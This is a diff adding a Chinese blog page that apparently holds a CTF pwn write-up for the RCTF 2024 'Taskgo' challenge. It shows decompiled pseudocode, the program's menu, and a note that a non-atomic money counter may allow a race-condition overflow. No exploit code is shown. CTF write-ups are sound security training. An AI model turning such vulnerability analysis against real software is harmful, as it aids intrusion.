@@ -1,0 +1,1138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="韩乔落">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+        
+        
+        
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://jelasin.github.io/2024/05/28/rctf-2024-pwn/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="写在前面很久不打 CTF 比赛了，感觉现在的 Pwn 对代码审计和 Fuzz ，信息收集(相关的CVE)和逆向能力要求越来越高了。 Taskgo个人感觉对于Go和Rust编译的程序来说，使用IDAPro来动态调试比gdb要好用一些。 逆向分析main main函数利用PostTask提交CtfMain()任务。 1234567891011121314v13 &#x3D; g_main_thread_task">
+<meta property="og:type" content="article">
+<meta property="og:title" content="RCTF-2024-pwn">
+<meta property="og:url" content="https://jelasin.github.io/2024/05/28/RCTF-2024-pwn/index.html">
+<meta property="og:site_name" content="Jelasin">
+<meta property="og:description" content="写在前面很久不打 CTF 比赛了，感觉现在的 Pwn 对代码审计和 Fuzz ，信息收集(相关的CVE)和逆向能力要求越来越高了。 Taskgo个人感觉对于Go和Rust编译的程序来说，使用IDAPro来动态调试比gdb要好用一些。 逆向分析main main函数利用PostTask提交CtfMain()任务。 1234567891011121314v13 &#x3D; g_main_thread_task">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-05-28T06:19:01.000Z">
+<meta property="article:modified_time" content="2024-05-29T09:46:33.193Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="RCTF">
+<meta name="twitter:card" content="summary">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/favicon.ico" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.ico">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/favicon.ico">
+    <!--- Page Info-->
+    
+    <title>
+        
+            RCTF-2024-pwn -
+        
+        Jelasin
+    </title>
+
+    <link rel="stylesheet" href="https://evan.beee.top/projects/hexo-theme-redefine/2.6.4/source/fonts/Chillax/chillax.css">
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        <link rel="stylesheet" href="https://evan.beee.top/projects/hexo-theme-redefine/2.6.4/source/assets/build/styles.css">
+    
+
+    <link rel="stylesheet" href="https://evan.beee.top/projects/hexo-theme-redefine/2.6.4/source/fonts/GeistMono/geist-mono.css">
+    <link rel="stylesheet" href="https://evan.beee.top/projects/hexo-theme-redefine/2.6.4/source/fonts/Geist/geist.css">
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    
+        <script src="https://evan.beee.top/projects/hexo-theme-redefine/2.6.4/source/js/libs/anime.min.js"></script>
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"jelasin.github.io","root":"/","language":"en","path":"search.xml"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":true,"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":"Noto Sans SC","url":"https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500;700&display=swap"},"english":{"enable":false,"family":"Farsan","url":"https://fonts.googleapis.com/css2?family=Farsan&display=swap"}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":false,"site_uv":false,"post_pv":true},"single_page":true,"preloader":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"“会当身由己，婉转入江湖”","subtitle":{"text":["Loading..."],"hitokoto":{"enable":true,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":null,"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.6.4","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Links":{"icon":"fa-regular fa-link","submenus":{"看雪":"https://bbs.kanxue.com/homepage-958172.htm","吾爱破解":"https://www.52pojie.cn/home.php?mod=space&uid=2101606&do=thread&view=me&from=space","中国诗歌网":"https://www.zgshige.com/c/2022-04-13/21151100.shtml"}}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":{"Essays":{"path":"/essays","icon":"fa-regular fa-comment"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"AI":{"path":"/AI","icon":"fa-brands fa-python"},"IOT":{"path":"/IOT","icon":"fas fa-network-wired"},"CTF":{"path":"/CTF","icon":"fa-solid fa-snowflake"},"Web":{"path":"/Web","icon":"fa-solid fa-shield"},"Linux":{"path":"/Linux","icon":"fa-brands fa-linux"},"Android":{"path":"/Android","icon":"fa-brands fa-android"},"Windows":{"path":"/Windows","icon":"fa-brands fa-windows"}}},"article_date_format":"auto","categories":{"enable":true,"limit":4},"tags":{"enable":true,"limit":4}},"footerStart":"2023/9/20 11:45:14"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    <link rel="stylesheet" href="https://evan.beee.top/projects/hexo-theme-redefine/2.6.4/source/fontawesome/fontawesome.min.css">
+    <link rel="stylesheet" href="https://evan.beee.top/projects/hexo-theme-redefine/2.6.4/source/fontawesome/brands.min.css">
+    <link rel="stylesheet" href="https://evan.beee.top/projects/hexo-theme-redefine/2.6.4/source/fontawesome/solid.min.css">
+    <link rel="stylesheet" href="https://evan.beee.top/projects/hexo-theme-redefine/2.6.4/source/fontawesome/regular.min.css">
+    
+    
+    
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+<!--        <span class="swup-progress-icon">-->
+<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+<!--        </span>-->
+    
+</div>
+
+
+
+    <style>
+    :root {
+        --preloader-background-color: #fff;
+        --preloader-text-color: #000;
+    }
+
+    @media (prefers-color-scheme: dark) {
+        :root {
+            --preloader-background-color: #202124;
+            --preloader-text-color: #fff;
+        }
+    }
+
+    @media (prefers-color-scheme: light) {
+        :root {
+            --preloader-background-color: #fff;
+            --preloader-text-color: #000;
+        }
+    }
+
+    @media (max-width: 600px) {
+        .ml13 {
+            font-size: 2.6rem !important; /* Adjust this value as needed */
+        }
+    }
+
+    .preloader {
+        display: flex;
+        flex-direction: column;
+        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
+        align-items: center;
+        justify-content: center;
+        position: fixed;
+        padding: 12px;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh; /* 'h-screen' is 100% of the viewport height */
+        background-color: var(--preloader-background-color);
+        z-index: 1100; /* 'z-[1100]' sets the z-index */
+        transition: opacity 0.2s ease-in-out;
+    }
+
+    .ml13 {
+        font-size: 3.2rem;
+        /* text-transform: uppercase; */
+        color: var(--preloader-text-color);
+        letter-spacing: -1px;
+        font-weight: 500;
+        font-family: 'Chillax-Variable', sans-serif;
+        text-align: center;
+    }
+
+    .ml13 .word {
+        display: inline-flex;
+        flex-wrap: wrap;
+        white-space: nowrap;
+    }
+
+    .ml13 .letter {
+        display: inline-block;
+        line-height: 1em;
+    }
+</style>
+
+<div class="preloader">
+    <h2 class="ml13">
+        Jelasin
+    </h2>
+    <script>
+        var textWrapper = document.querySelector('.ml13');
+        // Split text into words
+        var words = textWrapper.textContent.trim().split(' ');
+
+        // Clear the existing content
+        textWrapper.innerHTML = '';
+
+        // Wrap each word and its letters in spans
+        words.forEach(function(word) {
+            var wordSpan = document.createElement('span');
+            wordSpan.classList.add('word');
+            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
+            textWrapper.appendChild(wordSpan);
+            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
+        });
+
+        var animation = anime.timeline({loop: true})
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [40,0],
+                translateZ: 0,
+                opacity: [0,1],
+                filter: ['blur(5px)', 'blur(0px)'], // Starting from blurred to unblurred
+                easing: "easeOutExpo",
+                duration: 1400,
+                delay: (el, i) => 300 + 30 * i,
+            }).add({
+                targets: '.ml13 .letter',
+                translateY: [0,-40],
+                opacity: [1,0],
+                filter: ['blur(0px)', 'blur(5px)'], // Ending from unblurred to blurred
+                easing: "easeInExpo",
+                duration: 1200,
+                delay: (el, i) => 100 + 30 * i,
+                complete: function() {
+                    hidePreloader(); // Call hidePreloader after the animation completes
+                }
+            });
+
+        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;
+
+        // If the theme status is not found in local storage, check the preferred color scheme
+        if (themeStatus === undefined || themeStatus === null) {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                themeStatus = 'dark';
+            } else {
+                themeStatus = 'light';
+            }
+        }
+
+        // Now you can use the themeStatus variable in your code
+        if (themeStatus) {
+            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
+            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
+        } else {
+            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
+            document.documentElement.style.setProperty('--preloader-text-color', '#000');
+        }
+
+        window.addEventListener('load', function () {
+            setTimeout(hidePreloader, 5000); // Call hidePreloader after 5000 milliseconds if not already called by animation
+        });
+
+        function hidePreloader() {
+            var preloader = document.querySelector('.preloader');
+            preloader.style.opacity = '0';
+            setTimeout(function () {
+                preloader.style.display = 'none';
+            }, 200);
+        }
+    </script>
+</div>
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container px-6 md:px-12">
+
+    <div class="navbar-content ">
+        <div class="left">
+            
+                <a class="logo-image" href="/">
+                    <img src="/images/favicon.ico">
+                </a>
+            
+            <a class="logo-title" href="/">
+                
+                Jelasin
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    ARCHIVES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown"
+                                   href="#"
+                                        onClick=&#34;return false;&#34;>
+                                    <i class="fa-regular fa-link fa-fw"></i>
+                                    LINKS
+                                    <i class="fa-solid fa-chevron-down fa-fw"></i>
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                        
+                                            <li>
+                                                <a target="_blank" rel="noopener" href="https://bbs.kanxue.com/homepage-958172.htm">
+                                                    看雪
+                                                </a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a target="_blank" rel="noopener" href="https://www.52pojie.cn/home.php?mod=space&uid=2101606&do=thread&view=me&from=space">
+                                                    吾爱破解
+                                                </a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a target="_blank" rel="noopener" href="https://www.zgshige.com/c/2022-04-13/21151100.shtml">
+                                                    中国诗歌网
+                                                </a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                ARCHIVES
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item-sub text-base my-1.5 flex flex-col w-full">
+                        
+                        <div class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary cursor-pointer text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                             navbar-data-toggle="submenu-Links"
+                        >
+                            <span>
+                                LINKS
+                            </span>
+                            
+                                <i class="fa-solid fa-chevron-right fa-sm fa-fw transition-all"></i>
+                            
+                        </div>
+                        
+
+                        
+                            <div class="flex-col items-start px-2 py-2 hidden" data-target="submenu-Links">
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           target="_blank" rel="noopener" href="https://bbs.kanxue.com/homepage-958172.htm">看雪</a>
+                                    </div>
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           target="_blank" rel="noopener" href="https://www.52pojie.cn/home.php?mod=space&uid=2101606&do=thread&view=me&from=space">吾爱破解</a>
+                                    </div>
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           target="_blank" rel="noopener" href="https://www.zgshige.com/c/2022-04-13/21151100.shtml">中国诗歌网</a>
+                                    </div>
+                                
+                            </div>
+                        
+                    </li>
+            
+
+            
+            
+                
+                    
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                           href="/essays"
+                        >
+                            <span>Essays</span>
+                            <i class="fa-regular fa-comment fa-sm fa-fw"></i>
+                        </a>
+                    </li>
+                
+                    
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                           href="/categories"
+                        >
+                            <span>Categories</span>
+                            <i class="fa-regular fa-folder fa-sm fa-fw"></i>
+                        </a>
+                    </li>
+                
+                    
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                           href="/AI"
+                        >
+                            <span>AI</span>
+                            <i class="fa-brands fa-python fa-sm fa-fw"></i>
+                        </a>
+                    </li>
+                
+                    
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                           href="/IOT"
+                        >
+                            <span>IOT</span>
+                            <i class="fas fa-network-wired fa-sm fa-fw"></i>
+                        </a>
+                    </li>
+                
+                    
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                           href="/CTF"
+                        >
+                            <span>CTF</span>
+                            <i class="fa-solid fa-snowflake fa-sm fa-fw"></i>
+                        </a>
+                    </li>
+                
+                    
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                           href="/Web"
+                        >
+                            <span>Web</span>
+                            <i class="fa-solid fa-shield fa-sm fa-fw"></i>
+                        </a>
+                    </li>
+                
+                    
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                           href="/Linux"
+                        >
+                            <span>Linux</span>
+                            <i class="fa-brands fa-linux fa-sm fa-fw"></i>
+                        </a>
+                    </li>
+                
+                    
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                           href="/Android"
+                        >
+                            <span>Android</span>
+                            <i class="fa-brands fa-android fa-sm fa-fw"></i>
+                        </a>
+                    </li>
+                
+                    
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                           href="/Windows"
+                        >
+                            <span>Windows</span>
+                            <i class="fa-brands fa-windows fa-sm fa-fw"></i>
+                        </a>
+                    </li>
+                
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">31</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">17</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">38</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">RCTF-2024-pwn</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/touxiang.jpg">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">韩乔落</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2024-05-28 14:19:01</span>
+        <span class="mobile">2024-05-28 14:19:01</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2024-05-29 17:46:33</span>
+            <span class="mobile">2024-05-29 17:46:33</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/CTF/">CTF</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/RCTF/">RCTF</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>很久不打 CTF 比赛了，感觉现在的 Pwn 对代码审计和 Fuzz ，信息收集(相关的CVE)和逆向能力要求越来越高了。</p>
+<h1 id="Taskgo"><a href="#Taskgo" class="headerlink" title="Taskgo"></a>Taskgo</h1><p>个人感觉对于Go和Rust编译的程序来说，使用IDAPro来动态调试比gdb要好用一些。</p>
+<h2 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h2><p><strong>main</strong></p>
+<p>main函数利用PostTask提交CtfMain()任务。</p>
+<div class="highlight-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">v13 = g_main_thread_task_runner;</span><br><span class="line">base::Location::Current((base::Location *)v19, <span class="string">&quot;main&quot;</span>, <span class="string">&quot;XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX/ctf.cc&quot;</span>, <span class="number">217</span>);</span><br><span class="line">v14 = operator <span class="built_in">new</span>(<span class="number">0x30</span>uLL);</span><br><span class="line">base::internal::BindStateBase::BindStateBase(</span><br><span class="line">  v14,</span><br><span class="line">  base::internal::Invoker&lt;base::internal::FunctorTraits&lt;void (*&amp;&amp;)(void)&gt;,base::internal::BindState&lt;<span class="literal">false</span>,<span class="literal">true</span>,<span class="literal">false</span>,void (*)(void)&gt;,void ()(void)&gt;::RunOnce,</span><br><span class="line">  base::internal::BindState&lt;<span class="literal">false</span>,<span class="literal">true</span>,<span class="literal">false</span>,void (*)(void)&gt;::Destroy);</span><br><span class="line">*(_QWORD *)(v14 + <span class="number">32</span>) = CtfMain;</span><br><span class="line">base::TaskRunner::PostTask(v13, v19, v14);</span><br><span class="line">base::Location::Current((base::Location *)v19, <span class="string">&quot;main&quot;</span>, <span class="string">&quot;XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX/ctf.cc&quot;</span>, <span class="number">219</span>);</span><br><span class="line">base::RunLoop::Run((base::RunLoop *)v21, (<span class="keyword">const</span> base::Location *)v19);</span><br><span class="line">base::RunLoop::~RunLoop((base::RunLoop *)v21);</span><br><span class="line">base::Thread::Options::~Options((base::Thread::Options *)v26);</span><br><span class="line">base::Thread::~Thread((base::Thread *)v20);</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>CtfMain</strong></p>
+<p>CtfMain函数内，利用GetName函数在g_player结构体内存储名字，保存在g_player[0]上，g_player[6]保存了money。然后通过PostTask跑MainStmt()函数。</p>
+<div class="highlight-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">__int64 CtfMain(void)</span><br><span class="line">&#123;</span><br><span class="line">  [...]</span><br><span class="line">  GetName();</span><br><span class="line">  v3 = (__int128 *)g_player;</span><br><span class="line">  *((_DWORD *)v3 + <span class="number">6</span>) = <span class="number">10000</span>; <span class="comment">// money</span></span><br><span class="line">  [...]</span><br><span class="line">  v7 = g_main_thread_task_runner;</span><br><span class="line">  base::Location::Current((base::Location *)v10, <span class="string">&quot;CtfMain&quot;</span>, <span class="string">&quot;XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX/ctf.cc&quot;</span>, <span class="number">178</span>);</span><br><span class="line">  v8 = operator <span class="built_in">new</span>(<span class="number">0x30</span>uLL);</span><br><span class="line">  base::internal::BindStateBase::BindStateBase(</span><br><span class="line">    v8,</span><br><span class="line">    base::internal::Invoker&lt;base::internal::FunctorTraits&lt;void (*&amp;&amp;)(void)&gt;,base::internal::BindState&lt;<span class="literal">false</span>,<span class="literal">true</span>,<span class="literal">false</span>,void (*)(void)&gt;,void ()(void)&gt;::RunOnce,</span><br><span class="line">    base::internal::BindState&lt;<span class="literal">false</span>,<span class="literal">true</span>,<span class="literal">false</span>,void (*)(void)&gt;::Destroy);</span><br><span class="line">  *(_QWORD *)(v8 + <span class="number">0x20</span>) = MainStmt;</span><br><span class="line">  <span class="keyword">return</span> base::TaskRunner::PostTask(v7, v10, v8);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>MainStmt</strong></p>
+<p>这是程序的主菜单，功能如下：</p>
+<p>(1) Rapidly advancing in the rapids. </p>
+<p>子功能：<code>1. Wooden Boat.; 2. Silver Boat.; 3. Golden Boat.</code></p>
+<p>(2) Magic Castle.</p>
+<p>子功能：<code>1. Buy Magic Scroll.; 2. Drop Magic Scroll.; 3. Learning Magic Scroll.; 1337. Gods(需满足一定条件)</code>。</p>
+<p>(3) Show Money.</p>
+<p>(4) exit(0)</p>
+<p><strong>RapidAdvanceMenu</strong></p>
+<p>通过PostTask跑RapidAdvance::PickHandle()函数来进行选择处理，这里可以看出，v13+0x20是任务，v13+0x28保存了参数。将Repeat放进任务队列，Repeat又将MainStmt放进任务队列，这里存在潜在的条件竞争风险，因为money并不是原子数，可能存在竞争风险导致溢出。</p>
